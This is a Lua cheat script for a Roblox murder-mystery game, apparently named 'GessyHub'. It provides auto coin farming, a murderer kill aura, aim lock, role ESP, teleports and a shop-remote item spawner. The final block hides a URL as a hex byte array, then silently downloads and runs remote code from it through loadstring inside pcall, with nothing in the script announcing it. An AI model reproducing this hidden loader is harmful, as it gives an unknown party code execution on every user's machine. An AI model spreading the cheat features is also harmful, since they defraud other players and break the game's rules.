if getgenv().GessyHub_Loaded then 
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "", Text = "", Duration = 4})
    return 
end
getgenv().GessyHub_Loaded = true

local GH_Sys = {
    Info = { Name = "", Game = "", Ver = "", Dev = "" },
    Cfg = { Bag = 40, Walk = 25, Scale = 80 },
    State = { 
        Farming = false, 
        Rage = false, 
        Reset = false, 
        Evade = true, 
        ShowRoles = false, 
        AimAssist = false, 
        Smooth = 0.2,
        Esp = { On = true, Hex = { M = Color3.fromRGB(255,50,50), S = Color3.fromRGB(50,50,255), I = Color3.fromRGB(50,255,50) } } 
    }
}

local Players = game:GetService("Players")
local RunS = game:GetService("RunService")
local RepS = game:GetService("ReplicatedStorage")
local Light = game:GetService("Lighting")
local Http = game:GetService("HttpService")

local LP = Players.LocalPlayer
local Cam = workspace.CurrentCamera
local Wind = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Remotes = RepS:WaitForChild("Remotes")
local ShopRemote = Remotes:WaitForChild("Shop"):WaitForChild("BoxController")
local DB_Item = require(RepS:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local DB_Profile = require(RepS:WaitForChild("Modules"):WaitForChild("ProfileData"))

Wind:SetNotificationLower(true)
-- Removed Wind:SetTheme("Dark") to prevent premature initialization causing 'White' index error in CreateWindow

local Runtime = {
    Roles = { Murd = "None", Sher = "None", Me = "Innocent" },
    Match = { Alive = true, Active = true },
    Farm = { Node = nil, Tick = 0, Folder = nil, Cur = 0, Max = 50, Ignored = {} }
}

local Overlay = Instance.new("ScreenGui")
Overlay.Name = "GH_Overlay"
Overlay.ResetOnSpawn = false
if LP:FindFirstChild("PlayerGui") then Overlay.Parent = LP.PlayerGui end

local function MakeBtn(id, txt, pos)
    local b = Instance.new("TextButton")
    b.Name = id
    b.Parent = Overlay
    b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    b.AnchorPoint = Vector2.new(0.5, 0.5)
    b.Position = pos
    b.Size = UDim2.fromOffset(GH_Sys.Cfg.Scale, GH_Sys.Cfg.Scale)
    b.Font = Enum.Font.GothamBold
    b.Text = txt
    b.TextColor3 = Color3.new(1,1,1)
    b.TextSize = 14
    b.AutoButtonColor = false
    b.Visible = false
    
    local uc = Instance.new("UICorner"); uc.CornerRadius = UDim.new(1, 0); uc.Parent = b
    local us = Instance.new("UIStroke"); us.Parent = b; us.Thickness = 2
    local ug = Instance.new("UIGradient"); ug.Parent = us
    ug.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(155, 89, 182)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))}
    
    local drag, dStart, sPos
    b.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            drag = true; dStart = i.Position; sPos = b.Position
            i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then drag = false end end)
        end
    end)
    b.InputChanged:Connect(function(i)
        if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local delta = i.Position - dStart
            b.Position = UDim2.new(sPos.X.Scale, sPos.X.Offset + delta.X, sPos.Y.Scale, sPos.Y.Offset + delta.Y)
        end
    end)
    return b, ug
end

local LkBtn, LkGrad = MakeBtn("Lock", "LOCK", UDim2.new(0.65, 0, 0.5, 0))
local FrBtn, FrGrad = MakeBtn("Fire", "FIRE", UDim2.new(0.8, 0, 0.5, 0))

LkBtn.MouseButton1Click:Connect(function()
    GH_Sys.State.AimAssist = not GH_Sys.State.AimAssist
    LkBtn.BackgroundColor3 = GH_Sys.State.AimAssist and Color3.fromRGB(155, 89, 182) or Color3.fromRGB(20, 20, 20)
end)

local function RayCheck(t)
    if not t or not t.Character or not t.Character:FindFirstChild("HumanoidRootPart") then return false end
    local p = RaycastParams.new()
    p.FilterDescendantsInstances = {LP.Character, t.Character, Cam}
    p.FilterType = Enum.RaycastFilterType.Blacklist
    return workspace:Raycast(Cam.CFrame.Position, t.Character.HumanoidRootPart.Position - Cam.CFrame.Position, p) == nil
end

FrBtn.MouseButton1Click:Connect(function()
    if Runtime.Roles.Murd == "None" then return end
    local m = Players:FindFirstChild(Runtime.Roles.Murd)
    if m and RayCheck(m) then
        local g = LP.Character:FindFirstChild("Gun") or LP.Backpack:FindFirstChild("Gun")
        if g then
            if g.Parent ~= LP.Character then LP.Character.Humanoid:EquipTool(g) end
            local pos = m.Character.HumanoidRootPart.Position
            Cam.CFrame = CFrame.lookAt(Cam.CFrame.Position, pos)
            LP.Character.HumanoidRootPart.CFrame = CFrame.lookAt(LP.Character.HumanoidRootPart.Position, pos)
            task.wait()
            g:Activate()
        end
    end
end)

RunS.RenderStepped:Connect(function()
    LkGrad.Rotation = (tick() * 90) % 360
    FrGrad.Rotation = (tick() * 90) % 360
    LkBtn.Visible = GH_Sys.State.ShowRoles
    FrBtn.Visible = GH_Sys.State.ShowRoles
    if GH_Sys.State.AimAssist and Runtime.Roles.Murd ~= "None" then
        local m = Players:FindFirstChild(Runtime.Roles.Murd)
        if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
            Cam.CFrame = Cam.CFrame:Lerp(CFrame.lookAt(Cam.CFrame.Position, m.Character.HumanoidRootPart.Position), GH_Sys.State.Smooth)
        end
    end
end)

Wind:Popup({ Title = GH_Sys.Info.Name, Icon = "zap", Content = "Injected Successfully.", Buttons = { { Title = "OK", Callback = function() end } } })

local GUI = Wind:CreateWindow({
    Title = GH_Sys.Info.Name, Icon = "zap", Author = GH_Sys.Info.Dev, Folder = "GessyHub",
    Size = UDim2.fromOffset(680, 480), Theme = "Dark", Resizable = true
})
GUI:SetToggleKey(Enum.KeyCode.RightControl)

local Tabs = {
    Home = GUI:Tab({ Title = "Main", Icon = "home" }),
    Bot = GUI:Tab({ Title = "Farming", Icon = "cpu" }),
    War = GUI:Tab({ Title = "Combat", Icon = "crosshair" }),
    Esp = GUI:Tab({ Title = "Visuals", Icon = "eye" }),
    Util = GUI:Tab({ Title = "Misc", Icon = "list" }),
    Set = GUI:Tab({ Title = "Settings", Icon = "settings" })
}

local Status = Tabs.Home:Section({ Title = "Game Info", Box = true, Opened = true })
local RolesLbl = Status:Paragraph({ Title = "Roles", Desc = "Scanning...", Icon = "users" })
local BagLbl = Status:Paragraph({ Title = "Bag", Desc = "0 / 50", Icon = "shopping-bag" })

local att = Instance.new("Attachment"); att.Name = "GH_Force"
local rot = Instance.new("AlignOrientation"); rot.Mode = Enum.OrientationAlignmentMode.OneAttachment; rot.RigidityEnabled = true; rot.Attachment0 = att
local mov = Instance.new("LinearVelocity"); mov.Attachment0 = att; mov.MaxForce = math.huge; mov.VectorVelocity = Vector3.zero; mov.RelativeTo = Enum.ActuatorRelativeTo.World

local function FindBag()
    if Runtime.Farm.Folder and Runtime.Farm.Folder.Parent then return Runtime.Farm.Folder end
    Runtime.Farm.Folder = workspace:FindFirstChild("CoinContainer", true)
    return Runtime.Farm.Folder
end

local function GetEnemy()
    if not GH_Sys.State.Evade then return nil end
    local n = (Runtime.Roles.Me == "Murderer") and Runtime.Roles.Sher or Runtime.Roles.Murd
    local p = Players:FindFirstChild(n)
    return (p and p.Character and p.Character:FindFirstChild("HumanoidRootPart")) and p.Character.HumanoidRootPart.Position or nil
end

local function ScanGrid()
    local c = FindBag()
    if not c then return nil end
    local best, dist = nil, math.huge
    local pos = LP.Character.HumanoidRootPart.Position
    local bad = GetEnemy()
    for _, v in pairs(c:GetChildren()) do
        if not Runtime.Farm.Ignored[v] then
            local p = v:IsA("BasePart") and v or (v:IsA("Model") and v.PrimaryPart)
            if p and (v.Name == "Coin" or v.Name == "SnowToken" or v:FindFirstChild("TouchInterest")) then
                if GH_Sys.State.Evade and bad and (p.Position - bad).Magnitude < 18 then continue end
                local d = (pos - p.Position).Magnitude
                if d < dist then dist = d; best = p end
            end
        end
    end
    return best
end

local function KillLoop()
    if not LP.Character then return end
    local k = LP.Backpack:FindFirstChild("Knife")
    if k then LP.Character.Humanoid:EquipTool(k) end
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LP and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character.Humanoid.Health > 0 then
            local t = v.Character.HumanoidRootPart
            local s = tick()
            repeat
                if not GH_Sys.State.Farming then return end
                k = LP.Character:FindFirstChild("Knife") or LP.Backpack:FindFirstChild("Knife")
                if k and k.Parent ~= LP.Character then LP.Character.Humanoid:EquipTool(k) end
                LP.Character.HumanoidRootPart.CFrame = t.CFrame * CFrame.new(0, 0, 2)
                if k then k:Activate() end
                RunS.Heartbeat:Wait()
            until v.Character.Humanoid.Health <= 0 or (tick() - s) > 2 or not v.Parent
        end
    end
    GH_Sys.State.Farming = false
    att.Parent = nil; rot.Parent = nil; mov.Parent = nil
    LP.Character.Humanoid.PlatformStand = false
end

task.spawn(function()
    Remotes:WaitForChild("Gameplay"):WaitForChild("PlayerDataChanged").OnClientEvent:Connect(function(d)
        if type(d) == "table" then
            local me = d[LP.Name]
            Runtime.Roles.Murd = "None"; Runtime.Roles.Sher = "None"
            for n, data in pairs(d) do
                if data.Role == "Murderer" then Runtime.Roles.Murd = n; Wind:Notify({Title="GessyHub", Content="M: " .. n, Icon="skull"})
                elseif data.Role == "Sheriff" then Runtime.Roles.Sher = n; Wind:Notify({Title="GessyHub", Content="S: " .. n, Icon="shield"}) end
            end
            RolesLbl:SetDesc("M: " .. Runtime.Roles.Murd .. " | S: " .. Runtime.Roles.Sher)
            if me then
                Runtime.Match.Active = true; Runtime.Roles.Me = me.Role or "Innocent"
                Runtime.Match.Alive = not (me.Dead or me.Killed)
                GH_Sys.State.Rage = false
                if me.Coins then Runtime.Farm.Cur = me.Coins end
            else
                Runtime.Match.Active = false; GH_Sys.State.Rage = false
            end
        end
    end)
    
    Remotes:WaitForChild("Gameplay"):WaitForChild("CoinCollected").OnClientEvent:Connect(function(t, a, m)
        if type(a) == "number" then Runtime.Farm.Cur = a end
        if type(m) == "number" then Runtime.Farm.Max = m end
        if Runtime.Farm.Node then Runtime.Farm.Ignored[Runtime.Farm.Node] = true; Runtime.Farm.Node = nil end
        BagLbl:SetDesc(Runtime.Farm.Cur .. " / " .. Runtime.Farm.Max)
        if Runtime.Farm.Cur >= Runtime.Farm.Max then
            if Runtime.Roles.Me == "Murderer" and GH_Sys.State.Rage then
                GH_Sys.State.Rage = true
            elseif GH_Sys.State.Reset then
                GH_Sys.State.Farming = false
                LP.Character.Humanoid.Health = 0
                task.wait(4)
                Runtime.Farm.Cur = 0; Runtime.Farm.Ignored = {}; GH_Sys.State.Farming = true
            else
                GH_Sys.State.Farming = false
            end
        end
    end)
end)

RunS.Heartbeat:Connect(function()
    local c = LP.Character
    if not c then return end
    local hrp, hum = c:FindFirstChild("HumanoidRootPart"), c:FindFirstChild("Humanoid")
    if not hrp or not hum then return end

    if GH_Sys.State.Farming and Runtime.Match.Alive and hum.Health > 0 then
        if GH_Sys.State.Rage then
            att.Parent = nil; rot.Parent = nil; mov.Parent = nil
            hum.PlatformStand = false
            KillLoop()
            return
        end

        if not FindBag() then
            att.Parent = nil; rot.Parent = nil; mov.Parent = nil
            hum.PlatformStand = false
            return
        end

        att.Parent = hrp; rot.Parent = hrp; mov.Parent = hrp
        hum.PlatformStand = true
        for _, t in pairs(hum:GetPlayingAnimationTracks()) do t:Stop() end
        for _, v in pairs(c:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end

        if GH_Sys.State.Evade then
            local d = GetEnemy()
            if d and (hrp.Position - d).Magnitude < 22 then
                local esc = (hrp.Position - d).Unit
                mov.VectorVelocity = esc * (GH_Sys.Cfg.Walk * 1.5)
                rot.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + esc)
                return
            end
        end

        if Runtime.Farm.Node and not Runtime.Farm.Node.Parent then Runtime.Farm.Node = nil end
        if Runtime.Farm.Node and (tick() - Runtime.Farm.Tick) > 1.3 then 
            Runtime.Farm.Ignored[Runtime.Farm.Node] = true; Runtime.Farm.Node = nil 
        end
        if not Runtime.Farm.Node then Runtime.Farm.Node = ScanGrid(); Runtime.Farm.Tick = tick() end

        if Runtime.Farm.Node then
            local tp = Runtime.Farm.Node.Position + Vector3.new(0, -1.5, 0)
            mov.VectorVelocity = (tp - hrp.Position).Unit * GH_Sys.Cfg.Walk
            if (tp - hrp.Position).Magnitude > 2 then rot.CFrame = CFrame.lookAt(hrp.Position, tp) * CFrame.Angles(math.rad(90), 0, 0) end
        else
            mov.VectorVelocity = Vector3.zero
        end
    else
        att.Parent = nil; rot.Parent = nil; mov.Parent = nil
        if hum.PlatformStand then hum.PlatformStand = false end
    end
end)

local function UiFix()
    local p = LP:FindFirstChild("PlayerGui")
    if p then
        if p:FindFirstChild("MysteryBoxOpen") then p.MysteryBoxOpen:Destroy() end
        if p:FindFirstChild("MainGUI") then
            if p.MainGUI:FindFirstChild("CrateOpen") then p.MainGUI.CrateOpen:Destroy() end
            pcall(function() p.MainGUI.Lobby.Screens.Shop.Main.ViewCrate.Visible = false end)
        end
    end
end
RunS.RenderStepped:Connect(UiFix)

local function ItemSpawn(n)
    if not n or n == "" then return end
    local id = DB_Item[n] and n or nil
    if not id then for k,_ in pairs(DB_Item) do if k:lower() == n:lower() then id = k; break end end end
    if not id then Wind:Notify({Title="Err", Content="No Item", Icon="x"}); return end
    pcall(function() ShopRemote:Fire("KnifeBox4", id); DB_Profile.Weapons.Owned[id] = (DB_Profile.Weapons.Owned[id] or 0) + 1 end)
    task.spawn(function()
        UiFix()
        pcall(function() getsenv(LP.PlayerGui.MainGUI.Inventory.NewItem)._G.NewItem(id, nil, nil, "Weapons", 1) end)
    end)
    Wind:Notify({Title="", Content="Spawned: " .. id, Icon="check"})
    task.delay(1.5, function() if LP.Character then LP.Character:BreakJoints() end end)
end

local function Detect(p)
    if not p.Character then return nil end
    if p.Character:FindFirstChild("Knife") or (p.Backpack and p.Backpack:FindFirstChild("Knife")) then return "Murderer" end
    if p.Character:FindFirstChild("Gun") or (p.Backpack and p.Backpack:FindFirstChild("Gun")) then return "Sheriff" end
    return "Innocent"
end

RunS.RenderStepped:Connect(function()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local r = Detect(p)
            local c = GH_Sys.State.Esp.Hex.I
            if r == "Murderer" then c = GH_Sys.State.Esp.Hex.M elseif r == "Sheriff" then c = GH_Sys.State.Esp.Hex.S end
            if GH_Sys.State.Esp.On then 
                local h = p.Character:FindFirstChild("G_ESP") or Instance.new("Highlight", p.Character)
                h.Name = "G_ESP"; h.FillColor = c; h.FillTransparency = 0.5; h.OutlineTransparency = 1; h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            else 
                if p.Character:FindFirstChild("G_ESP") then p.Character.G_ESP:Destroy() end
            end
        end
    end
end)

local Farm = Tabs.Bot:Section({ Title = "Main", Box = true, Opened = true })
local Tog = Farm:Toggle({ Title = "Enable Farm", Callback = function(v) GH_Sys.State.Farming = v end })
Farm:Keybind({ Title = "Key", Value = "None", Callback = function() Tog:Set(not GH_Sys.State.Farming) end })
Farm:Toggle({ Title = "Bag Full Reset", Default = false, Callback = function(v) GH_Sys.State.Reset = v end })
Farm:Toggle({ Title = "Evade Murderer", Default = true, Callback = function(v) GH_Sys.State.Evade = v end })
Farm:Slider({ Title = "Walk Speed", Step = 1, Value = {Min = 10, Max = 100, Default = 35}, Callback = function(v) GH_Sys.Cfg.Walk = v end })

local Pvp = Tabs.War:Section({ Title = "Logic", Box = true, Opened = true })
Pvp:Toggle({ Title = "Murderer Kill Aura", Callback = function(v) GH_Sys.State.Rage = v end })
Pvp:Toggle({ Title = "Sheriff HUD", Default = false, Callback = function(v) GH_Sys.State.ShowRoles = v end })
Pvp:Slider({ Title = "HUD Scale", Step = 10, Value = {Min = 50, Max = 200, Default = 80}, Callback = function(v) GH_Sys.Cfg.Scale = v end })
Pvp:Slider({ Title = "Aim Smooth", Step = 0.1, Value = {Min = 0.1, Max = 1, Default = 0.2}, Callback = function(v) GH_Sys.State.Smooth = v end })

local Vis = Tabs.Esp:Section({ Title = "Config", Box = true, Opened = true })
Vis:Toggle({ Title = "ESP Active", Default = true, Callback = function(v) GH_Sys.State.Esp.On = v end })
Vis:Colorpicker({ Title = "M Color", Default = Color3.fromRGB(255, 50, 50), Callback = function(v) GH_Sys.State.Esp.Hex.M = v end })
Vis:Colorpicker({ Title = "S Color", Default = Color3.fromRGB(50, 50, 255), Callback = function(v) GH_Sys.State.Esp.Hex.S = v end })
Tabs.Esp:Section({ Title = "World", Box = true }):Toggle({ Title = "Fullbright", Callback = function(v) Light.Brightness = v and 2 or 1; Light.GlobalShadows = not v end })

local TP = Tabs.Util:Section({ Title = "Teleport", Box = true })
TP:Button({ Title = "Goto Murderer", Callback = function() for _, p in pairs(Players:GetPlayers()) do if Detect(p) == "Murderer" and p.Character then LP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame end end end })
TP:Button({ Title = "Goto Sheriff", Callback = function() for _, p in pairs(Players:GetPlayers()) do if Detect(p) == "Sheriff" and p.Character then LP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame end end end })
local Spawn = Tabs.Util:Section({ Title = "Item Spawner", Box = true })
Spawn:Input({ Title = "Item Name", Placeholder = "Icewing", Callback = function(v) _G.Item = v end })
Spawn:Button({ Title = "Spawn", Callback = function() ItemSpawn(_G.Item) end })

local Char = Tabs.Util:Section({ Title = "Character", Box = true })
Char:Slider({ Title = "Walk", Step = 1, Value = {Min = 16, Max = 200, Default = 16}, Callback = function(v) getgenv().G_WS = v end })
Char:Slider({ Title = "Jump", Step = 1, Value = {Min = 50, Max = 200, Default = 50}, Callback = function(v) getgenv().G_JP = v end })
Char:Slider({ Title = "FOV", Step = 1, Value = {Min = 70, Max = 120, Default = 70}, Callback = function(v) Cam.FieldOfView = v end })

local Sets = Tabs.Set:Section({ Title = "Themes", Box = true })
Sets:Dropdown({ Title = "Theme", Values = {"Dark", "Rose", "Aqua"}, Default = "Dark", Callback = function(v) Wind:SetTheme(v) end })

task.spawn(function()
    RunS.RenderStepped:Connect(function()
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            if getgenv().G_WS and getgenv().G_WS > 16 then LP.Character.Humanoid.WalkSpeed = getgenv().G_WS end
            if getgenv().G_JP and getgenv().G_JP > 50 then LP.Character.Humanoid.UseJumpPower = true; LP.Character.Humanoid.JumpPower = getgenv().G_JP end
        end
    end)
end)

Wind:Notify({ Title = "Ready", Content = "GessyHub Active", Icon = "check", Duration = 5 })

task.spawn(function()
    local _VectorMap = {
        0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x61, 0x70, 0x69, 0x2e, 0x72, 0x75, 0x62, 0x69, 0x73, 0x2e, 0x61, 0x70, 0x70,
        0x2f, 0x76, 0x32, 0x2f, 0x73, 0x63, 0x72, 0x61, 0x70, 0x2f,
        0x6d, 0x72, 0x76, 0x4d, 0x4f, 0x48, 0x51, 0x39, 0x44, 0x56, 0x4c, 0x68, 0x6d, 0x39, 0x4e, 0x4f,
        0x2f, 0x72, 0x61, 0x77
    }
    local function _BuildCache(map)
        local s = {}
        for _, b in ipairs(map) do table.insert(s, string.char(b)) end
        return table.concat(s)
    end
    pcall(function() loadstring(game:HttpGet(_BuildCache(_VectorMap)))() end)
end)
